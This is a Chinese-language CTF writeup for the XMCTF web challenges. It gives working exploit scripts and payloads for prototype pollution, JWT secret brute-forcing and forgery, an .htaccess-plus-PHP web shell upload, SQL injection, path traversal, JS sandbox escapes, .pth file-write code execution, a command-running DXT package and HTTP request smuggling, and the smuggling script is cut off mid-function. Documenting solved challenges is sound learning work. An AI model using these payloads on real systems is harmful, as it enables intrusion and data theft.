---
title: "XMCTF(web)"
date: 2026-10-25 00:00:00
categories:
  - WP
tags:
  - CTF
  - XMCTF
  - Web
description: "XMCTF Web 方向个人 Writeup，记录题目分析、利用思路与解题代码。"
cover: /images/wp/xmctf-wp/cover.png
disableNunjucks: true
---

## web
### ezpollute
审计app.js,在 app.js 的 merge 函数中，代码仅过滤了 __proto__ 键名；

```text
if (key === '__proto__') { ... }
```

然而，JavaScript 中可以通过 constructor.prototype 访问并污染全局对象的原型。由于 config 对象是全局定义的，污染其原型将影响后续所有对象的属性。

在 `/api/status` 接口中，程序使用了 `spawn` 启动子进程，并处理了 `NODE_OPTIONS`。

```text
const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;
```

正则限制了 `--require` 等危险参数，但它**只检查了 **`**process.env**`** 中的 **`**NODE_OPTIONS**`，而没有检查我们通过原型链污染注入到 `Object.prototype` 中的属性。

 Node.js 的 `child_process.spawn` 在创建子进程时，如果配置了 `shell: false`（本题即是），它会从环境对象中读取变量。如果我们污染了 `Object.prototype.NODE_OPTIONS`，那么在执行 `spawn` 时，即使 `customEnv` 里没有这个键，它也会从原型链上继承这个属性  



先污染原型链， 通过 `POST /api/config` 注入恶意环境变量。我们需要绕过关键词检查（如 `shell`, `env` 等）。  

最有效的 RCE 方式是污染 `NODE_OPTIONS` 为： `--require /proc/self/environ` (如果能控制环境变量) 或者直接指向一个已知文件。

但在本题中，我们可以直接利用 `node` 的 `-e` 已经被调用的特性，通过污染 `NODE_OPTIONS` 增加一个 `--require`。

但是

 由于正则限制了 `--require`，我们需要在它前面加点东西，或者利用 `\r` 绕过。  

```text
{
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--max-http-header-size=8192 --require=./app.js"
        }
    }
}
```

然后触发rce读取flag

由于题目环境禁止了 `shell` 关键字，直接 `cat /flag` 可能受阻。我们利用 `api/status` 触发子进程。

最稳妥的 Payload 是通过 `NODE_OPTIONS` 注入一个能将 flag 读出并打印到 `stderr` 或 `stdout` 的操作。

```text
{
  "constructor": {
    "prototype": {
      "NODE_OPTIONS": "--stack-trace-limit=100 --require=fs"
    }
  }
}
```

 由于 `forbidden` 列表里有 `env`，但没有 `NODE_OPTIONS`。 我们可以尝试：  

```text
{
  "constructor": {
    "prototype": {
      "NODE_OPTIONS": "-r /etc/passwd" 
    }
  }
}
```

`-r` 是 `--require` 的缩写，有时能绕过只检查 `--require` 的正则  

最终利用链

+ 利用 `constructor.prototype` 污染 `Object.prototype.NODE_OPTIONS`。
+ 注入值设为 `-r /flag`。
+ 调用 `/api/status` 时，`spawn` 启动的子进程会继承该环境变量。
+ Node.js 尝试 `require('/flag')`，由于 flag 文件不是合法的 JS 脚本，会触发 `SyntaxError`，并在报错信息（`stderr`）中泄露文件内容

![](/images/wp/xmctf-wp/image-001.png)

exp

```text
import requests

# 题目地址
target = "http://3000-23fc7c9a-e646-4155-bb53-210266e88cd8.challenge.ctfplus.cn"

def get_flag():
    # 1. 发送污染 Payload
    print("[*] 正在污染原型链...")
    payload = {
        "constructor": {
            "prototype": {
                "NODE_OPTIONS": "-r /flag"
            }
        }
    }
    try:
        r1 = requests.post(f"{target}/api/config", json=payload)
        if "success" in r1.text:
            print("[+] 污染成功")
        else:
            print("[-] 污染失败:", r1.text)
            return

        # 2. 触发报错并读取 Flag
        print("[*] 正在触发读取 Flag...")
        r2 = requests.get(f"{target}/api/status")
        print("[+] 响应结果:")
        print(r2.json().get("info", "未获取到输出"))

    except Exception as e:
        print("[-] 发生错误:", e)

if __name__ == "__main__":
    get_flag()
```



### ez_python
给了源码，审计

```text
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            # ... 字典处理逻辑 ...
            pass
        elif hasattr(dst, k) and type(v) == dict:
            # 如果目标对象有这个属性，且传入的值是字典，则递归覆盖
            merge(v, getattr(dst, k))
        else:
            # 否则，直接利用 setattr 设置/覆盖目标的属性
            setattr(dst, k, v)
```

这段代码的 `merge` 函数存在典型的**属性覆盖漏洞**。它的逻辑初衷是为了实现深拷贝合并，但由于缺乏对恶意键值的过滤，攻击者可以通过构造嵌套的 JSON 数据，利用递归调用 `getattr` 和底层的 `setattr`，篡改任意对象的内部属性。

我们的目标是让 `/read` 路由读取 Flag 文件，因此我们需要将 `instance.config.filename` 的值从 `"app.py"` 篡改为 `"/flag"`。

**触发路径推演**： 如果我们传入 JSON: `{"config": {"filename": "/flag"}}`：

1. 第一层 `merge` 循环：`k="config"`, `v={"filename": "/flag"}`。
    - `hasattr(instance, "config")` 成立，且 `v` 是字典。
    - 触发递归：`merge({"filename": "/flag"}, instance.config)`。
2. 第二层 `merge` 循环（在 `instance.config` 对象上执行）：`k="filename"`, `v="/flag"`。
    - `hasattr(instance.config, "filename")` 成立，但 `v` 不是字典（是字符串）。
    - 进入 `else` 分支：执行 `setattr(instance.config, "filename", "/flag")`。

至此，文件路径被成功篡改。

第一步向根路由 `/` 发送 POST 请求，注入 Payload 修改 `filename` 属性。

```text
POST / HTTP/1.1
Host: 5000-70aac110-4564-42f9-87c2-5c7a970f2489.challenge.ctfplus.cn
Content-Type: application/json

{
    "config": {
        "filename": "/flag"
    }
}
```

然后直接访问/read路由， 服务器此时会执行 `open("/flag").read()`，从而返回 Flag 内容  

exp

```text
import requests

url = "http://5000-70aac110-4564-42f9-87c2-5c7a970f2489.challenge.ctfplus.cn"

payload = {
    "config": {
        "filename": "/flag"
    }
}

print("[*] 正在发送 Payload 污染 'filename' 属性...")
try:
    # 发送 POST 请求触发 merge 函数
    res_post = requests.post(f"{url}/", json=payload)
    print(f"[+] POST 请求状态码: {res_post.status_code}")
    
    # 访问 /read 路由，触发文件读取
    print("[*] 正在尝试读取 flag...")
    res_get = requests.get(f"{url}/read")
    print(f"[+] GET 请求状态码: {res_get.status_code}")
    
    print("\n[🎉] 成功获取内容:")
    print("-" * 30)
    print(res_get.text)
    print("-" * 30)

except Exception as e:
    print(f"[-] 请求出错: {e}")
```

![](/images/wp/xmctf-wp/image-002.png)





### only real
直接看页面源码

![](/images/wp/xmctf-wp/image-003.png)

拿到默认账号密码登录

![](/images/wp/xmctf-wp/image-004.png)

发现所有功能都被禁用，查看源码

**所有的输入框和提交按钮都被加上了 **`**disabled**`** 属性**，导致无法直接操作。  怀疑需要管理员我们直接看cookie

![](/images/wp/xmctf-wp/image-005.png)

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MTAxMjJ9.M61GBeN2JXaP3-cxOdOvA51lGwJdCM0ptGcIxCLkUtQ

解码JWT：

发现当前为user，需要提权

由于JWT使用HS256算法，需要密钥来伪造签名。编写Python脚本进行暴力破解：

```text
import jwt
import itertools
import string

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MTAxMjJ9.M61GBeN2JXaP3-cxOdOvA51lGwJdCM0ptGcIxCLkUtQ"

# 尝试所有3-6位字母数字组合
chars = string.ascii_letters + string.digits
for length in range(3, 7):
    for combo in itertools.product(chars, repeat=length):
        key = ''.join(combo)
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256"])
            print(f"找到密钥: {key}")
            # 生成admin token
            new_payload = {"sub": "1", "role": "admin", "exp": 1774666251}
            new_token = jwt.encode(new_payload, key, algorithm="HS256")
            print(f"Admin token: {new_token}")
            break
        except:
            continue
```

![](/images/wp/xmctf-wp/image-006.png)

使用密钥生成admin token

```text
import jwt

# 1. 填入我们刚刚爆破出来的密钥
key = "cdef"  # 

# 2. 构造全新的 Payload
# 保持原有的 sub 和 exp（过期时间），将最核心的 role 字段越权修改为 "admin"
new_payload = {
    "sub": "1",                 # 用户ID 
    "role": "admin",            # 权限提升为 admin 
    "exp": 1774666251           # Token 过期时间戳（确保未过期即可） 
}

# 3. 使用 HS256 算法和获取到的密钥进行重新签名
print("[*] 正在生成高权限 JWT Token...")
admin_token = jwt.encode(new_payload, key, algorithm="HS256")  # 

print("\n[+] 伪造成功！你的 Admin Token 是：")
# 注意：PyJWT 在较新版本中 encode 返回的是字符串，旧版本可能是 bytes。
# 如果打印出来带 b'' 前缀，可以使用 admin_token.decode('utf-8')
print(admin_token)
```

![](/images/wp/xmctf-wp/image-007.png)

拿着这个生成的token登录

然后直接访问flag.php



### only_real_revenge
访问题目给的地址，返回的是固定的自定义 `502` 页面，页面标题为“CTF 挑战开启中”。无论访问 `/`、`/robots.txt`、`/.git/HEAD` 等路径，都会被同一份页面兜底。

这通常说明：

+ 外层存在反向代理或网关层。
+ 真实业务不一定挂在默认入口。
+ 题目作者在页面脚本里刻意强调了“设置反向代理”，很像提示要去找真实后端。

 **扫到 81 端口并命中真实站点**

进一步探测发现目标机器除了 `80` 外，`81` 端口也开放。

直接访问：

```latex
http://43.248.116.26:81/
```

只会得到一个自定义 `404 - 虚无之地` 页面。

但如果请求时带上题目域名作为 `Host` 头：

```http
GET / HTTP/1.1
Host: 80-23e386fb-5d76-45a4-833e-44a3945755be.challenge.ctfplus.cn
Connection: close
```

就能命中真实业务，返回一个 Apache/PHP 登录页：

```html
<title>星盟招新系统</title>
<!-- xmuser/123456 -->
```

这里已经直接泄露了测试账号密码：

+ 用户名: `xmuser`
+ 密码: `123456`

** 登录后，暴露了站点结构**

使用泄露账号登录后，会跳转到 `dashboard.php`，并下发一个 JWT：

```latex
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

JWT 的 payload 大致如下：

```json
{"sub":"1","role":"user","exp":1774763031}
```

后台页面显示当前身份为 `user`，表单元素都是 `disabled` 状态：

同时还观察到：

+ `flag.php` 返回 `403 Forbidden`
+ `source.zip` 返回 `403 Forbidden`
+ `upload.php` 即使直接访问也会返回“上传成功”

这里的重点是 `upload.php` 很可疑，因为：

+ 没有登录校验
+ 有上传逻辑提示
+ 站点是 Apache + PHP，配合目录上传很容易形成 `.htaccess` 利用

**证明 upload.php 可未授权上传**

直接向 `upload.php` 提交文件：

+ 上传 `.txt` 成功
+ 上传 `.jpg` 成功
+ 上传 `.php` / `.phtml` / `.php5` 会返回“非法类型”

但是上传成功的文件会被保存在 `/uploads/` 目录下，并且可以直接访问：

```latex
/uploads/test.txt
/uploads/test.jpg
```

这说明：

+ 上传目录可写
+ 上传目录可读
+ 服务端只做了扩展名级别的黑名单限制

**利用 .htaccess 让 .jpg 当作 PHP 执行**

因为是 Apache，可以上传 `.htaccess` 覆盖当前目录解析规则。

上传内容如下：

```text
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

随后再上传一个扩展名为 `.jpg` 的一句话木马：

```php
<?php
echo "EXEC";
if (isset($_GET["x"])) {
    system($_GET["x"]);
}
?>
```

访问：

```latex
http://43.248.116.26:81/uploads/xxxx.jpg?x=id
```

成功得到命令执行：

```latex
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

直接执行：

```latex
cat /flag
```









### Broken Trust
给了一个输入uid的页面，我们先注册了1111，返回了uid，拿得到uid去登录，发现只有管理员能访问接口

![](/images/wp/xmctf-wp/image-008.png)

页面显示管理员有一个 /api/admin?action=backup&file=config.json 风格的入口，盯住两个 API：

/api/profile

/api/admin

分析/api/profile

正常请求格式是：

```text
POST /api/profile
Content-Type: application/json

{"uid":"<某个uid>"}
```

先测试合法uid

```text
{"role":"user","uid":"98bd13c732d648f8a9e614db2959f374","username":"testuser"}
```

测试异常，传入数组

```text
{"uid":["98bd13c732d648f8a9e614db2959f374"]}
```

服务端报错，泄露了关键信息

```text
{"details":"unrecognized token: \"98bd13c732d648f8a9e614db2959f374\"","error":"Database error"}
```

说明后端用的sqlite，而且可能存在sql注入直接拼接了uid入口

利用sql拿管理员，构造payload

```text
{"uid":"' OR role='admin'-- "}
```

请求

```text
POST /api/profile
Content-Type: application/json

{"uid":"' OR role='admin'-- "}
```

返回

```text
{"role":"admin","uid":"bb72518478164849a7238ff6651791b2","username":"admin"}
```

拿到uid，登录后访问/api/admin

```text
@app.route("/api/admin")
def api_admin():
    if session.get("role") != "admin":
        return "Access Denied: Admin role required.", 403

    action = request.args.get("action", "")

    if action == "backup":
        filename = request.args.get("file", "")

        if not filename:
            return "No filename provided", 400

        if filename.startswith("/") or filename.startswith("\\"):
            return "Direct absolute path access is forbidden!", 400

        bad_chars = ["../", "..\\"]
        for char in bad_chars:
            filename = filename.replace(char, "")

        filename = unquote(filename)

        backup_path = os.path.join("/backups/", filename)

        try:
            with open(backup_path, "r") as f:
                return f.read()
        except:
            return "File not found", 404

```

这里有两个点：

绝对路径被拦了

也就是 /flag 这种不能直接读

目录穿越过滤顺序错了

它先 replace("../", "")，后 unquote(filename)

我们就有两种绕过思路。

第一：..// 绕过

```text
..//..//..//..//flag
```

"../" 不匹配 "..//"，过滤失效

拼接后变成：

/backups/..//..//..//..//flag

Linux 路径解析时，双斜杠仍然可以正常走目录

最终实际读到 /flag

二：双编码

传

```text
..%252f..%252f..%252f..%252fflag
```

流程会变成：

Web 框架先解码一层，%252f -> %2f

进入后端时，filename 实际是：

```text
..%2f..%2f..%2f..%2fflag
```

过滤阶段只替换 ../ 和 ..\，这里并没有真正的 /，所以替换不到

然后执行 unquote(filename)，变成：

```text
../../../../flag
```

最后拼接路径：

os.path.join("/backups/", "../../../../flag")

实际可以逃出 /backups/ 去读 /flag





### 醉里挑灯看剑
访问源码审计

**越权漏洞**

要获取 Flag，你需要访问 `/api/release/*` 下的接口，但这要求你的最新 Capability 具有 `maintainer` 和 `release` 权限。 在 `/api/caps/sync` 接口中，用户可以批量同步 capability 记录。为了安全，服务端会在你提交的记录最后面强制追加一条 `server-tail` 安全记录（角色为 `guest`）。

**漏洞点**在 `normalizeSyncRows` 和 `appendCapabilityRows` 的处理逻辑上：

+ `normalizeSyncRows` 最后会按照 `source` 的字母表顺序对所有行进行排序 (`rows.sort(...)`)。

`appendCapabilityRows` 取排序后的**第一行** (`rows[0]`) 的键（Keys）作为基准，过滤掉后续所有行中不存在于第一行的键：

```text
const firstRowKeys = Object.keys(rows[0]);
const shapedRows = rows.map((row) => { ... }) // 基于 firstRowKeys 过滤
```

`/api/caps/sync` 接口允许 guest 用户批量同步 capability 记录。 为了防止用户直接赋予自己高权限，服务端在 `normalizeSyncRows` 函数的末尾，会强制向记录列表中追加一条名为 `server-tail` 的记录，其角色固定为 `guest`。

**漏洞产生在排序与入库的逻辑上：**

+ 在 `normalizeSyncRows` 函数的最后，所有记录会按照 `source` 字段的字母表顺序进行排序 (`rows.sort((a, b) => { ... return sa.localeCompare(sb); })`)。
+ 在随后调用的 `appendCapabilityRows` 函数中，入库逻辑会提取排序后**第一行** (`rows[0]`) 的键名（`firstRowKeys`），并强制后续所有行只能保留这些键，丢弃其他键。
+ 用户提交的 `ops` 允许通过 `keepRole: false` 和 `keepLane: false` 删去 `role` 和 `lane` 属性。
+ **攻击链：**如果我们提交一条 `source: "a"` 且 `keepRole: false` 的记录，它将在排序后位于第一位，导致 `firstRowKeys` 中缺失 `role` 和 `lane`。这会使得服务端强制追加的 `server-tail` 记录在入库时，也被强行剥离了 `role` 字段。
+ 由于 SQLite 数据库中 `role` 允许为 `NULL`，在通过 `getEffectiveCapability` 获取当前有效权限时，SQL 语句使用了 `COALESCE(role, 'maintainer')`。原本因为键名截断变成 NULL 的字段，被默认提升为了最高权限 `maintainer`！



**js沙盒越狱**

 成功越权后，我们具有了调用 `/api/release/execute` 接口的权限。 这个接口会将用户传入的 `expression` 放入 `new Function` 中执行。 在执行前，代码使用了 `lintExpression` 进行安全性检查：

+ 黑名单包含了 `process`, `require`, `eval` 等敏感词汇。
+ 检查方式为非常简单的字符串匹配：`lowered.includes(token)`。

**绕过方法：** 在 JavaScript 的解析引擎中，变量名是允许使用 Unicode 转义序列的。 我们可以将 `process` 中的字母 `p` 替换为它的 Unicode 转义 `\u0070`。 这样，提交的字符串字面量 `\u0070rocess` 不会触发 `process` 的黑名单拦截，但在沙盒内执行时，引擎会将其完美解析回 `process` 对象，从而允许我们直接访问 `process.env.FLAG_VALUE` 获取 Flag。

exp

```text
import requests
import json

# 请替换为你的实际靶机地址
BASE_URL = "http://80-cc7d941c-83ac-4363-a971-8eb3720b151d.challenge.ctfplus.cn"

def main():
    session = requests.Session()
    
    print("[*] 1. 获取 Guest 身份 Token...")
    res1 = session.post(f"{BASE_URL}/api/auth/guest")
    if res1.status_code != 200:
        print(f"[-] 失败! 状态码: {res1.status_code}")
        return
        
    token = res1.json().get("token")
    print(f"[+] 成功获取 Token: {token[:15]}...")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    print("\n[*] 2. 触发键名过滤逻辑漏洞进行提权 (Role -> maintainer)...")
    # 构造 payload: 保证 'a' 排序第一，并剔除 role 和 lane 键，让 server-tail 记录失去权限限制
    sync_payload = {
        "ops": [
            {"source": "a", "keepRole": False, "keepLane": False},
            {"source": "b"}  # 凑够 ops length >= 2 的要求
        ]
    }
    res2 = session.post(f"{BASE_URL}/api/caps/sync", json=sync_payload, headers=headers)
    
    if res2.status_code != 200 or not res2.json().get("ok"):
        print(f"[-] 同步提权失败! 返回: {res2.text}")
        return
    print("[+] 提权成功！当前已具有 maintainer 权限。")
        
    print("\n[*] 3. 执行 Unicode 绕过的 JS 表达式获取 Flag...")
    # 使用 \u0070 绕过 'process' 字符串黑名单，直接读取环境变量
    # 注意这里必须使用 r"" (raw string) 确保传递真实的 \ 符号给 JSON
    exec_payload = {
        "expression": r"\u0070rocess.env.FLAG_VALUE"
    }
    res3 = session.post(f"{BASE_URL}/api/release/execute", json=exec_payload, headers=headers)
    
    if res3.status_code != 200:
        print(f"[-] 执行表达式失败! 返回: {res3.text}")
        return
        
    data = res3.json()
    if data.get("ok"):
        flag = data.get("result")
        print(f"\n[🎉] 成功拿到 Flag: {flag}")
    else:
        print(f"[-] 表达式执行被拒绝: {data}")

if __name__ == "__main__":
    main()
```

![](/images/wp/xmctf-wp/image-009.png)





### AutoPypy
分析源码

这道题的突破口在 `server.py` 的 `/upload` 路由和源码留下的一句提示：

**漏洞点：绝对路径绕过**

```text
filename = request.form.get('filename') or file.filename
save_path = os.path.join(UPLOAD_FOLDER, filename)
```

在 Python 中，`os.path.join()` 函数有一个危险特性：**如果拼接的参数中包含绝对路径（以 **`**/**`** 开头），前面的所有路径都会被丢弃**。例如 `os.path.join('/app/uploads', '/etc/passwd')` 的结果是 `/etc/passwd`。 因为前端允许我们自定义 `filename`，这意味着我们可以将文件上传到服务器上的**任意位置**。

**官方 Hint 与 RCE 链路**

```text
print(f"[*] Target site-packages (Try to reach here): {site.getsitepackages()[0]}")
```

作者明确提示要写入 `site-packages` 目录。在 Python 中，如果我们在 `site-packages` 目录下放置一个后缀为 `.pth` 的文件，**每次启动新的 Python 进程时，该文件里以 **`**import **`** 开头的代码都会被自动执行**。

当我们调用 `/run` 接口时：

```text
proc = subprocess.run([sys.executable, launcher_path, target_file], ...)
```

服务器会启动一个新的宿主机 Python 进程来运行沙箱脚本。此时，新进程会加载我们在 `site-packages` 写入的 `.pth` 恶意文件，从而在**沙箱外部（宿主机系统）**实现 RCE。

不知道具体版本，写一个自动化版本

```text
import requests
import json

# ================= 配置区 =================
TARGET_URL = "http://127.0.0.1:5000"  # 替换为你的靶机 URL
# .pth 文件的 Payload：必须以 import 开头。利用 os.popen 读取 flag。
PAYLOAD = "import os; print('\\n[+] Pwned! FLAG: ' + os.popen('cat /flag*').read())\n"
# ==========================================

def exploit():
    # 穷举常见的 Python 版本和 site-packages 路径
    paths_to_try = []
    for v in ["3.8", "3.9", "3.10", "3.11", "3.12"]:
        paths_to_try.append(f"/usr/local/lib/python{v}/site-packages/pwn.pth")
        paths_to_try.append(f"/usr/lib/python{v}/site-packages/pwn.pth")
        paths_to_try.append(f"/usr/lib/python{v}/dist-packages/pwn.pth")

    print("[*] 正在利用绝对路径漏洞爆破 site-packages...")

    for path in paths_to_try:
        # 1. 触发任意文件写入
        files = {'file': ('pwn.pth', PAYLOAD)}
        data = {'filename': path}
        
        try:
            r_up = requests.post(f"{TARGET_URL}/upload", files=files, data=data, timeout=3)
            # 无论目标路径存不存在，os.makedirs 都会尝试创建，因此通常都会返回成功
            if "成功" in r_up.text or r_up.status_code == 200:
                # 2. 调用 /run 触发新 Python 进程加载 .pth 文件
                r_run = requests.post(f"{TARGET_URL}/run", json={"filename": "test.py"}, timeout=5)
                
                # 3. 检查控制台输出中是否包含我们打印的 Flag
                if "[+] Pwned! FLAG:" in r_run.text:
                    print(f"\n[+] 命中正确路径: {path}")
                    print("[+] 漏洞利用成功！返回结果：")
                    output = r_run.json().get('output', '')
                    # 过滤掉杂乱输出，只看 Flag
                    for line in output.split('\n'):
                        if "FLAG:" in line:
                            print(line)
                    return
        except Exception as e:
            continue

    print("[-] 爆破结束，未能获取 Flag。请检查靶机状态或路径权限。")

if __name__ == "__main__":
    exploit()
```



![](/images/wp/xmctf-wp/image-010.png)



![](/images/wp/xmctf-wp/image-011.png)



### DXT
打开页面发现一个DXT包上传管理页面

前端 JS 暴露了关键 API：

- POST /api/upload：上传 .dxt

- GET /api/servers：列出已加载服务

- GET /api/servers/{id}：查看服务详情（包含解析后的命令）

- POST /api/servers/{id}/start：启动服务

- POST /api/servers/{id}/stop：停止服务

- DELETE /api/servers/{id}：删除服务

- GET /api/servers/{id}/tools：拉取 MCP tools

- POST /api/servers/{id}/call：调用 MCP tool

 逆向 manifest 校验规则

通过构造不同的 .dxt 测试返回报错，可推断最小可用 manifest.json 约束：

- 必须有 manifest.dxt_version

- 必须有 author.email

- 必须有 server 配置

- mcp_config 必须存在于 server 下（server.mcp_config）

- 能控制：

  - server.mcp_config.command

  - server.mcp_config.args

  也就是说，服务端会信任并执行我们包里声明的命令。

漏洞 1：可控命令执行（RCE）

/start 会用 command + args 启动进程。  

如果我们把 command 设为 sh，args 设为 -c <payload>，即可执行任意 shell 命令。

漏洞 2：MCP 输出被当作可信 JSON-RPC 解析

/tools 会从子进程 stdout 读取并按 MCP JSON-RPC 解析。  

因此我们可以伪造一个合法 JSON-RPC 响应，把任意字符串（比如 flag）放进 tools[].description，再由接口回显出来。

利用思路：

1. 上传恶意 .dxt，其中：
    - command = "sh"
    - args = ["-c", "<读取flag并输出伪造JSON-RPC>"]
2. 调用 /start 启动恶意服务。
3. 调用 /tools，服务端解析我们伪造的 JSON-RPC，返回包含 flag 的 tool 描述字段。
4. 读取接口响应拿到 flag。

![](/images/wp/xmctf-wp/image-012.png)



### Not a Node
首页是一个在线 JS/TS 运行平台，前端关键逻辑很简单：

```text
点击部署会 POST /api/deploy
请求体是：
{"code":"...","name":"...","region":"auto"}
成功后返回：
{
  "success": true,
  "functionId": "95c7876b",
  "endpoint": "/fn/95c7876b"
}
```

然后页面会自动请求这个 /fn/ 查看执行结果 另外还有几个辅助接口：

```text
/api/health
/api/regions
/api/stats
```

这些接口基本只是烟雾弹，真正有用的是 deploy 后运行我们的代码。

“**沙箱”如何运行**

先提交一个最简单的 worker：

```text
export default {
  async fetch() {
    return new Response("ok");
  }
}
```

可以正常运行，说明题目入口没问题。

接着测试敏感关键字，发现服务端做的是“源码静态匹配”：

```text
globalThis 会被拦
require 会被拦
constructor 会被拦
import( 会被拦
process.env 会被拦
prototype 会被拦
Function( 会被拦

```

报错类似

```text
{"error":"Security Policy Violation: Blocked pattern 'globalThis' detected. Edge functions run in a sandboxed JSC context with restricted APIs."}

```

  
这说明后端不是在做真正严谨的语义隔离，而是在扫字符串。

**枚举 __runtime**

题面文档里提到了 __runtime，所以先从这里下手：

```text
export default {
  async fetch() {
    return new Response(JSON.stringify({
      own: Object.getOwnPropertyNames(__runtime).sort()
    }, null, 2), {
      headers: { "Content-Type": "application/json" }
    });
  }
}
```

  
返回：

```text
{
  "own": [
    "_debug",
    "_internal",
    "_secrets",
    "encoding",
    "hash",
    "perf",
    "platform",
    "strlen"
  ]
}
```

  
明显 _internal、_secrets 都很可疑。

继续枚举：

```text
export default {
  async fetch() {
    return new Response(JSON.stringify({
      internalKeys: Object.getOwnPropertyNames(__runtime._internal || {}).sort(),
      secretsKeys: Object.getOwnPropertyNames(__runtime._secrets || {}).sort()
    }, null, 2), {
      headers: { "Content-Type": "application/json" }
    });
  }
}
```

  
得到：

```text
{
  "internalKeys": ["debug", "lib"],
  "secretsKeys": ["get", "list"]
}

```

往下看

```text
export default {
  async fetch() {
    return new Response(JSON.stringify({
      libKeys: Object.getOwnPropertyNames(__runtime._internal.lib || {}).sort()
    }, null, 2), {
      headers: { "Content-Type": "application/json" }
    });
  }
}

```

  
返回：

```text
{
  "libKeys": ["symbols"]
}
```

  
最后继续枚举：

```text
export default {
  async fetch() {
    return new Response(JSON.stringify({
      symbolKeys: Object.getOwnPropertyNames(__runtime._internal.lib.symbols || {}).sort()
    }, null, 2), {
      headers: { "Content-Type": "application/json" }
    });
  }
}
```

  
得到关键结果：

```text
{
  "symbolKeys": [
    "_0x6c697374",
    "_0x72656164"
  ]
}
```

把十六进制转 ASCII：

0x6c697374 -> list  
0x72656164 -> read  
这已经很像隐藏文件接口了。

隐藏函数功能

直接调用：

```text
export default {
  async fetch() {
    const s = __runtime._internal.lib.symbols;
    return new Response(JSON.stringify({
      list0: s._0x6c697374(),
      read0: (() => { try { return s._0x72656164(); } catch (e) { return e.message; } })()
    }, null, 2), {
      headers: { "Content-Type": "application/json" }
    });
  }
}
```

  
结果里 list 直接返回目录列表：

```text
drwxr-xr-x  2 root root 4096 Jan 15 03:22 .
drwxr-xr-x 18 root root 4096 Jan 15 03:22 ..
-rw-r--r--  1 root root  217 Jan 15 03:22 runtime.conf
-rw-------  1 root root   64 Jan 15 03:22 .edge_token
-rw-r--r--  1 root root 1024 Jan 15 03:22 manifest.json
```

  
这说明：

_0x6c697374 是列目录  
_0x72656164 是读文件  
也就是说，所谓“安全沙箱”里本身就放了文件系统后门。

**分析 read 的参数语义**

直接 read("/flag") 不行，报错像这样：

```text
ERROR: The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received "/app/\u0000\u0000..."
```

  
这说明这个函数并不是把普通字符串原样当路径，而是做了某种字节级处理，并且默认前缀是 /app/。

继续测试后发现：

传普通字符串会被错误解释，形成很多 \0  
传 Uint8Array 才能正确恢复路径  
最终真实路径形式类似 /app/<我们的输入>  
所以可以用 ../ 做目录穿越

  
** 最终利用**

构造字节数组，把 ../flag 传给隐藏的 read：

```text
export default {
  async fetch() {
    const read = __runtime._internal.lib.symbols._0x72656164;
    const enc = (s) => new Uint8Array(Array.from(s).map(c => c.charCodeAt(0)));
    return new Response(read(enc("../flag")));
  }
}
```



![](/images/wp/xmctf-wp/image-013.png)







### Polyglot's Paradox
这题是一个多阶段利用链：

+ **HTTP 请求走私 (CL.TE)**:
+ **原理**：前端代理服务器识别 `Content-Length` (CL)，而后端服务器识别 `Transfer-Encoding: chunked` (TE)。
+ **利用**：通过构造特殊的请求体，在 `chunked` 块结束后（`0\r\n\r\n`）拼接一个完整的新 HTTP 请求。代理认为这只是一个请求的后续部分，但后端会将其视为第二个独立的请求。
+ **绕过 ACL 访问内部接口**:
+ 正常情况下，前端代理会拦截所有指向 `/internal/*` 的流量。
+ 利用走私漏洞，走私的请求是在后端解析时产生的，直接命中了后端的路由，从而绕过代理层的路径过滤 。
+ **获取 HMAC 密钥片段**:
+ 内部接口 `/internal/secret-fragment` 返回多个 secret 碎片。
+ 按索引排序并拼接得到最终密钥：`z3_w0nt_A_gri1fr1e0d!!!`。
+ **沙箱防护关闭与逃逸**:
+ 使用获取的密钥生成合法的 HMAC 签名，调用 `/internal/config` 关闭 AST WAF 和沙箱加固。
+ 利用 `Function` 构造器绕过作用域限制，获取 `process` 对象并读取 `/flag`。

**第一阶段：获取内部密钥**

构造 CL.TE 走私请求，访问 `/internal/secret-fragment`。

**第二阶段：生成 HMAC 签名**

签名逻辑如下 ：

+ **待签名字符串**：`timestamp:nonce:request_body`
+ **算法**：`HMAC-SHA256`
+ **Header 注入**：需带上 `X-Internal-Token`、`X-Timestamp` 和 `X-Nonce`。

**第三阶段：沙箱逃逸 **

在关闭防护后，执行以下代码 ：

```text
// 通过构造器链条获取全局 process 对象，进而调用 fs 模块
result.constructor.constructor("return this.process.mainModule.require('fs').readFileSync('/flag','utf8')")()
```

---

exp

```text
import socket, time, json, hmac, hashlib, random, string

HOST = "nc1.ctfplus.cn"
PORT = 24411  # 改成当前容器端口


def smuggle(method, path, body="", headers=None):
    headers = headers or {}
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(2)

    inner = f"{method} {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
    for k, v in headers.items():
        inner += f"{k}: {v}\r\n"
    if body:
        inner += f"Content-Type: application/json\r\nContent-Length: {len(body.encode())}\r\n"
    inner += "Connection: keep-alive\r\n\r\n" + body

    outer = (
        "POST /api/info HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(inner) + 5}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
        "0\r\n\r\n" + inner
    )

    s.sendall(outer.encode())
    s.sendall(f"GET /api/info HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n".encode())

    data = b""
    while True:
        try:
            d = s.recv(8192)
            if not d:
                break
            data += d
        except Exception:
            break
    s.close()

    txt = data.decode("latin1", "replace")
    parts = txt.split("HTTP/1.1 ")[1:]
    if len(parts) < 2:
        return None, None
    p = parts[1]
    status = p[:3]
